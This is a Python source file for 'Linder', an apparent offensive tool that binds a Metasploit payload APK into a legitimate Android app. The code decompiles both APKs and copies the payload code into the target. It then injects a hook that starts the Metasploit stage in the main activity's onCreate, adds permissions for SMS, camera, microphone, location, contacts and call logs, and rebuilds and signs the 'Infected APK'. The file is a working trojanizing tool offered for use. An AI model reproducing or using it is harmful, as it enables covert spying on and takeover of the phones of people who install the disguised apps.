import os,sys,subprocess,socket
import shutil,urllib.request
from xml.dom.minidom import parseString
from time import sleep


YELLOW = '\033[33m'
BLUE = '\033[34m'
CYAN = '\033[36m'
GREEN = '\033[32;1m'
RED = '\033[31;1m'
WHITE = '\033[m'


cp = ''
mv = ''
rm = ''

if os.name == 'nt':
	cp = 'xcopy /q /y'
	mv = 'move '
	rm = 'rmdir /S /Q'
else:
	cp = 'cp -r'
	mv = 'mv'
	rm = 'rm -rf'

global package, package_name, package_name_path, smali_loc, smali_path,P1


payload_input = 'Not set'
original_input = 'Not set'
final_path = 'Not set'
aapt2=False
interactive=False

def Termux_Bool():
	try:
		if 'termux' in os.environ['HOME']:
			return True
		else:
			return False
	except KeyError:
		return False

def err_msg(msg):
    print(RED + "[!] " + msg + WHITE)

def print_status(msg):
    print(CYAN + "[+] " + msg + WHITE)

def isOnline():
    try:
        # connect to the host
        socket.create_connection(("www.google.com", 80))
        return True
    except OSError:
        pass
    return False

def Update():
		print_status(YELLOW + 'Checking for updates...')
		oo = open('.ver','r').read()
		u=urllib.request.urlopen('https://raw.githubusercontent.com/R37r0-Gh057/Linder/master/.ver').read().decode('utf-8')
		if oo.split('\n')[0] == u.split('\n')[0]:
			print_status(YELLOW + 'No updates available')
		else:
			print_status(GREEN + "Update available. Updating...(DONT CLOSE!) ")
			files_to_update=['main.py','README.md','CONTRIBUTORS.md','termux-setup.sh','CHANGELOG.MD','.ver']
			for fn in files_to_update:
				try:
					u=urllib.request.urlopen('https://github.com/R37r0-Gh057/Linder/raw/master/'+fn).read().decode('utf-8')
				except:
					err_msg("Error While Fetching Updates...")
					print_status(YELLOW+"Reverting Changes...")
					for dlf in files_to_update:
						os.remove(dlf+'.tmp')
					print_status("Exiting....")
					exit()
				f=open(fn+'.tmp','w')
				f.write(u)
				f.close()
			for fn in files_to_update:
				os.rename(fn+'.tmp',fn)
			print_status(GREEN + "Update Finished....")
			print_status(BLUE + "Please Restart The Script...")
			exit()
def Usage():
	if Termux_Bool():
		print(YELLOW + 'python3 %s <payload.apk> <target.apk> <output.apk> <extra arg>\n' % (str(sys.argv[0])))
		print('Extra args:- ' + YELLOW + "--use-aapt2" + WHITE)
		exit()
	print(YELLOW + 'python3 %s <payload.apk> <target.apk> <output.apk>\n' % (str(sys.argv[0])))
	print('\n' + YELLOW + 'pass the ' + BLUE + "--update" + YELLOW + " parameter to update.\n" + WHITE)
	exit()

# Getting payload apk name

def PN():
	if '/' in payload_input:
		tmp = payload_input.split('/')
		name = tmp[len(tmp) - 1]
		return str(name)
	else:
		return payload_input

# Getting original apk name

def ON():
	if '/' in original_input:
		tmp = original_input.split('/')
		name = tmp[len(tmp) - 1]
		return name
	else:
		return original_input



# Finding main activity smali

def findA(xml):
	Android = ''
	with open(xml,'r') as f:
		dom = parseString(f.read())
		activities = dom.getElementsByTagName('activity')
		for activity in activities:
			intents = activity.getElementsByTagName('intent-filter')
			for intent in intents:
				actions = intent.getElementsByTagName('action')
				for action in actions:
					if action.getAttribute('android:name') == 'android.intent.action.MAIN':
						Android += activity.getAttribute('android:name') + '\n'
						break
	return Android.split('\n')[0]

# If couldnt find path of activity, then joining the package name and activity name to get the activity path

def SetA(A):
	if len(A.split('.')) == 1:
		A = P1+'.'+A		# P1 variable stores the package name
	elif len(A.split('.')) == 2:
		A= P1+A
	return A

# Finding package name
def findP(xml):
	fi = open(xml,'r')
	f=fi.readline()+fi.readline()
	pos1=f.find("package=")+9
	pos2=f.find('"',pos1+1)
	if pos1==8:
		return ''
	else:
		return f[pos1:pos2]

# Self Explanatory:

def SetP(P):
	global package,P1
	if '"' in P:
		P = P.replace('"','')
	if '>' in P:
		P = P.replace('>','')
	if '<' in P:
		P = P.replace('<','')
	P1 = P
	package = P.replace('.', '/')
	return package, P


# Finding hook point in the main activity smali
def find(smali,par):
	count = 0
	SmaliCon = ''
	TargetStr = ''

	with open(smali,'r') as f:
		SmaliCon = f.read()
		for i in SmaliCon.split('\n'):
			if 'invoke-super' in i and 'onCreate(Landroid/os/Bundle;)V' in i:
					TargetStr = i
					break
			else:
				count += 1
	if TargetStr != '':
		print ("Hook point can be injected after line %d" % (count + 1))
		return SmaliCon, TargetStr, count

# Injecting hook in smali

def newsmali(contents,targetstring):
	with open('newsmali','w') as f:
		for i in contents.split('\n'):
			if i == targetstring:
				f.write('\n')
				f.write(i)
				f.write('\n')
				f.write('    invoke-static {p0}, Lcom/metasploit/stage/Payload;->start(Landroid/content/Context;)V')
			else:
				f.write('\n')
				f.write(i)


# The main event

def Bind():
	try:
		global out
		Perms_List = ['<uses-permission android:name="android.permission.INTERNET"/>',
                        '<uses-permission android:name="android.permission.ACCESS_WIFI_STATE"/>',
                        '<uses-permission android:name="android.permission.CHANGE_WIFI_STATE"/>',
                        '<uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>',
                        '<uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>',
                        '<uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>',
                        '<uses-permission android:name="android.permission.READ_PHONE_STATE"/>',
                        '<uses-permission android:name="android.permission.SEND_SMS"/>',
                        '<uses-permission android:name="android.permission.RECEIVE_SMS"/>',
                        '<uses-permission android:name="android.permission.RECORD_AUDIO"/>',
                        '<uses-permission android:name="android.permission.CALL_PHONE"/>',
                        '<uses-permission android:name="android.permission.READ_CONTACTS"/>',
                        '<uses-permission android:name="android.permission.WRITE_CONTACTS"/>',
                        '<uses-permission android:name="android.permission.RECORD_AUDIO"/>',
                        '<uses-permission android:name="android.permission.WRITE_SETTINGS"/>',
                        '<uses-permission android:name="android.permission.CAMERA"/>',
                        '<uses-permission android:name="android.permission.READ_SMS"/>',
                        '<uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>',
                        '<uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>',
                        '<uses-permission android:name="android.permission.SET_WALLPAPER"/>',
                        '<uses-permission android:name="android.permission.READ_CALL_LOG"/>',
                        '<uses-permission android:name="android.permission.WRITE_CALL_LOG"/>',
                        '<uses-permission android:name="android.permission.WAKE_LOCK"/>']

		Feature_List = ['<uses-feature android:name="android.hardware.camera"/>',
                        '<uses-feature android:name="android.hardware.camera.autofocus"/>',
                        '<uses-feature android:name="android.hardware.microphone"/>']


		payload = PN()
		original = ON()

	# STEP 1.
		
		try:
			if os.path.isdir("TempP"):
				print_status("Cleaning Temporary Files...")
				subprocess.call(rm + " TempP",shell=True)
				if not os.path.isdir("TempP"):
					os.mkdir("TempP")
				print_status("done.")
			else:
				os.mkdir("TempP")
		except:
			pass
		print_status("Copying APKs...")
		subprocess.call(cp + ' ' +  payload_input + " TempP", shell=True)
		subprocess.call(cp + ' ' + original_input + " TempP", shell=True)

		print_status("done.")

	# STEP 2.

		print_status("Decompiling APKs...\n")
		os.chdir("TempP/")
		if Termux_Bool():
			os.system('apkmod -d %s -o %s' % (original,original.replace('.apk','')))
			os.system('apkmod -d %s -o %s' % (payload,payload.replace('.apk','')))
		else:
			os.system('apktool d -f %s' % (original))
			os.system('apktool d -f %s' % (payload))

		print_status("\ndone.")
	# STEP 3.

		print_status('Copying payload smali codes to target apk...')
		if cp.lower().startswith("xcopy"):
			subprocess.call(cp + ' /e "%s/smali/"  "%s/smali/"' % (payload.replace('.apk',''), original.replace('.apk','')), shell=True)
		else:
			subprocess.call(cp + ' "%s/smali/com/"  "%s/smali/"' % (payload.replace('.apk',''), original.replace('.apk','')), shell=True)
		print_status("done.")

	# STEP 4.

		print_status("Fetching Package Name & MainActivity smali location")
		package_name_path, package_name = SetP(findP('%s/AndroidManifest.xml' % (original.replace('.apk',''))))
		smalitarget = SetA(findA("%s/AndroidManifest.xml" % (original.replace('.apk',''))))
		smali_name = smalitarget.split('.')[len(smalitarget.split('.')) - 1]
		smali_loc = smalitarget.replace('.','/')
		if not os.path.isfile("%s/smali/%s.smali" % (original.replace('.apk',''),smali_loc)): # Will be fixed in the next update
			err_msg(YELLOW + "\n\nIt looks like this app is somewhat protected. \nThe MainActivity smali file which is specified in the AndroidManifest.xml (%s) is not present. This will be fixed in the next update\n CANNOT CONTINUE. EXITING..." % (smali_loc))
			subprocess.call(rm + 'TempP')
			exit()
		else:
			smali_name = smali_loc.split('/')[len(smali_loc.split('/')) - 1]
			print_status("\nMainActivity Smali location:- " + GREEN + '%s' %(str(smali_loc)))
			print_status('Package Name:- ' + GREEN + '%s' % (str(package_name)))
			print ("\n")

	# STEP 5.
		print_status("Injecting Hook")
		con,trgstr,lineno = find(original.replace('.apk','')+'/smali/'+smali_loc+'.smali','null' )
		newsmali(con,trgstr)
		subprocess.call(mv + ' newsmali %s/smali/%s.smali' % (original.replace('.apk',''), smali_loc),shell=True)

	# STEP 6.

		print_status ("Writing Permissions,Features,etc.")
		tar_man='%s/AndroidManifest.xml' % (original.replace('.apk',''))
		with open(tar_man,'r') as f:
			con = f.read()
			spcP = 0
			spcF = 0
			delF = []
			delP = []
			fbool = False
			pbool = False
			for i in con.split('\n'):
				if Perms_List.count(i.strip()) >0:
					Perms_List.remove(i.strip())
					spcP = i.find('<')
				elif Feature_List.count(i.strip()) >0:
					Feature_List.remove(i.strip())
					spcF = i.find('<')
			f1 = open(tar_man,'w')
			for i in con.split('\n'):
				if "<uses-permission " in i and not pbool:
					for k in Perms_List:
						f1.write('\n')
						print (YELLOW + "\n 	Injecting Permission:- " + WHITE + k)
						f1.write((' ' * spcP) + k)
					pbool = True
				elif "<uses-feature " in i and not fbool:
					for k in Feature_List:
						f1.write('\n')
						print (YELLOW + "\n 	Injecting Feature:- " + WHITE + k)
						f1.write((' ' * spcF) + k)
					fbool = True
				else:
					f1.write(i)
					f1.write('\n')
			f1.close()
		
		print_status('done.')

	# STEP 6.

		print_status('Compiling Infected APK...\n')

		if Termux_Bool():
			if aapt2:
				subprocess.call("apkmod -a -r %s -o fin_out.apk" % (original.replace('.apk','')),shell=True)
				os.chdir('../')
			else:
				subprocess.call("apkmod -r %s -o fin_out.apk" % (original.replace('.apk','')),shell=True)
				os.chdir('../')
		else:
			subprocess.call("apktool b %s -o %s -f" % (original.replace('.apk',''),str(final_path)),shell=True)
			subprocess.call(mv + ' '+ str(final_path) + ' ..',shell=True)
			os.chdir('../')
		print_status('Signing Infected APK...\n')
		if Termux_Bool():
			subprocess.call("apkmod -s TempP/fin_out.apk -o %s" % (str(final_path)),shell=True)
			print ( GREEN + "\nInfected app saved :  " + YELLOW + " %s (%s bytes)" % (str(final_path),str(os.path.getsize(str(final_path)))) + WHITE)	
			subprocess.call(rm + " TempP",shell=True)
			exit()
		else:
			subprocess.call("apksigner sign --ks release.keystore --ks-pass pass:lmaolmfao %s" % (str(final_path)),shell=True)
		print ( GREEN + "\nInfected app saved :  " + YELLOW + " %s (%s bytes)" % (str(final_path),str(os.path.getsize(str(final_path)))) + WHITE)
		subprocess.call(rm + " TempP",shell=True)
		exit()
	except (UnicodeDecodeError) as e:
		subprocess.call(rm + ' TempP',shell=True)
		err_msg("Looks like APKTool has failed to decompile properly. Exiting...")
		exit()
	except Exception as e:
		subprocess.call(rm + ' TempP',shell=True)
		err_msg("ERROR OCCURED! EXITING...")
		print('\n' + str(e.args))
		exit()

def pathcheck(b,par):
	global final_path
	a = ''
	delim = ''
	if '/' in b:
		delim='/'
	elif '\\' in b:
		delim='\\'
	else:
		final_path=b
		if par == 'interactive':
				print('output ==> ' + final_path)
	if delim == '':
		if par == 'interactive':
				print('output ==> ' + final_path)
		final_path=b
	else:
		for i in b.split(delim):
			if i == '':
				a += delim
			elif '.apk' in i:
				pass
			else:
				a+=i+delim
		if os.path.exists(a):
			final_path=b
			if par == 'interactive':
				print('output ==> ' + final_path)
		else:
			err_msg('Output path specified does not exists')
			if par!='interactive':
				exit()
			pass


class Interactive:
	def __init__(self):
		pass

	def SetCMD(self,option,value):
		global payload_input,original_input,final_path,aapt2
		if option.lower() == 'payload':
			if os.path.isfile(value):
				payload_input = value
				print("Payload ==> "+value)
			else:
				err_msg("Invalid path. '%s': does not exists." % (value))
		elif option.lower() == 'target':
			if os.path.isfile(value):
				original_input = value
				print("Target ==> "+value)
			else:
				err_msg("Invalid path. '%s': does not exists." % (value))
		elif option.lower() == 'output':
			pathcheck(value,'interactive')
		elif Termux_Bool() and option.lower() == 'aapt2':
			if value.lower() == 'true':
				aapt2 = True
				print('aapt2 ==> True')
			elif value.lower() == 'false':
				aapt2 = False
				print('aapt2 ==> False')
			else:
				err_msg('invalid value selected.')
				print('available values: True, False')

		else:
			err_msg("Invalid option selected")
			print('Allowed Options Are: payload , target, output')
	def usage(self):
		print('----LIST OF COMMANDS----\n')
		print('----COMMAND 		ACTION----\n')
		print('[+] set  		set options [set <option> <value>]\n')
		print('[+] options 		show available options and their values\n')
		print('[+] bind 		start binding\n')
		print('[+] clear		clear the screen.\n')
		print('[+] update 		update the script\n')
		print('[+] help  		show this help message\n')
		print('[+] exit 		does what it says.\n')

	def clear(self):
		if os.name == 'nt':
			print(subprocess.getoutput('cls'))
		else:
			print(subprocess.getoutput('clear'))


	def Start(self):
		global payload_input,original_input,final_path,aapt2
		print_status("\nStarted Interactive mode. Type 'help' for list of available commands.\n")
		while True:
			void = input(YELLOW + "Linder>> " + WHITE).strip().split(' ')
			void=[vd for vd in void if vd.strip()!='']
			if 'set' in void and len(void) == 3:
				self.SetCMD(void[1],void[2])
			elif void[0].lower() == 'bind':
				if payload_input!='Not set' and original_input!='Not set' and final_path!='Not set':
					Bind()
				else:
					err_msg("Some option(s) are not set.")
			elif void[0].lower() == 'exit':
				exit()
			elif void[0].lower() == 'help':
				self.usage()
			elif void[0].lower() == 'clear':
				self.clear()
			elif void[0].lower() == 'update':
				if isOnline():
					Update()
				else:
					err_msg('Please turn ON your data connection')
			elif void[0].lower() == 'options':
				if Termux_Bool():
					print('aapt2 => '+str(aapt2))
				print('Payload => '+payload_input)
				print('Target => ' +original_input)
				print('Output => '+final_path)
			else:
				err_msg('Invalid Command')


# Checking whether APKTOOL & APKSIGNER are installed or not.

def main():
	global interactive
	print_status("Checking whether APKTOOL is installed or not...")
	if shutil.which('apktool') == None:
		err_msg("ERROR: " + WHITE + "APKTOOL is not installed or not in path. Exiting.")
		exit()
	else:
		print(GREEN + "INSTALLED" + WHITE)
	if Termux_Bool():
		if shutil.which('apkmod')==None:
			err_msg("ERROR: " + WHITE + "Please run " + GREEN + "termux-setup.sh" + WHITE + " to install dependencies.")
			exit()
		else:
			if interactive:
				Interactive().Start()
			else:
				Bind()
	print_status("Checking whether APKSIGNER is installed or not...")
	if shutil.which('apksigner')==None:
		err_msg("\nERROR: " + WHITE + "APKSIGNER is not installed or not in path. Exiting")
		exit()
	else:
		print(GREEN + "INSTALLED" + WHITE)
	print_status(YELLOW + "ALL OK, Checking args...\n\n")
	if interactive:
		Interactive().Start()
	else:
		Bind()


# This is self explanatory.

def argscheck():
	global interactive,payload_input,original_input,final_path,aapt2
	if len(sys.argv) == 4:
		if os.path.isfile(str(sys.argv[1])) and os.path.isfile(str(sys.argv[2])):
			if not '.apk' in sys.argv[3]:
				err_msg('Output APK name not specified')
				exit()
			pathcheck(sys.argv[3],'null')
			payload_input=sys.argv[1]
			original_input=sys.argv[2]
			final_path=sys.argv[3]
			main()
		else:
			err_msg('APK(s) specified are not found!')
			exit()
	elif len(sys.argv) == 5 and Termux_Bool():
		if str(sys.argv[4]) == '--use-aapt2':
			aapt2 = True
			print_status('Using aapt2')
		else:
			Usage()
			exit()
		if os.path.isfile(str(sys.argv[1])) and os.path.isfile(str(sys.argv[2])):
			if not '.apk' in sys.argv[3]:
				err_msg('Output APK name not specified')
				exit()
			pathcheck(sys.argv[3],'null')
			payload_input=sys.argv[1]
			original_input=sys.argv[2]
			final_path=sys.argv[3]
			main()
		else:
			err_msg('APK(s) specified are not found!')
			exit()
	elif len(sys.argv) == 2:
		if str(sys.argv[1]) == '--update':
                        if isOnline():
                            Update()
                        else:
                            err_msg("Please turn ON your data connection")
                            exit()
		else:
			Usage()
			exit()
	else:
		interactive=True
		main()


# Lol
print ('\nAuthor:' + RED + "R37r0 Gh057\n" + WHITE)
print ('Github: ' + GREEN + "https://github.com/R37r0-Gh057\n" + WHITE)
print ('Telegram:' + BLUE + "@R37R0_GH057\n" + WHITE)
print("\nSPECIAL THANKS TO:- " + RED + 'TheSpeedX ' + BLUE + "{" + GREEN + 'https://github.com/TheSpeedX' + BLUE + "}" + WHITE + " For Optimising the script. :D\n\n")
print("====================================================\n\n")
sleep(1)

# Finally:-
if not os.path.isfile("release.keystore"):
	err_msg("\nERROR: keystore file not found. EXITING...")
	exit()
else:
	argscheck()
